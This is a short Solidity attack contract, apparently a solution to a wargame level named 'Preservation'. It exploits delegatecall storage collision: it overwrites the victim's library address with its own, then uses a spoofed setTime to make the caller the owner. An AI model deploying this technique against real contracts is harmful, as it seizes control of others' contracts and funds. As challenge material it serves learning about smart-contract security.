// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackPreservation {
    address public slot1;
    address public slot2;
    address public owner;

    constructor(address _preservation) public {
        preservation = _preservation;
    }

    address public preservation;

    function changeAddressTimeZone1() external {
        (bool success,) = address(preservation).call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(address(this))));
        require(success, "Call failed");
    }

    function setTime(uint _time) external {
        owner = tx.origin;
    }
}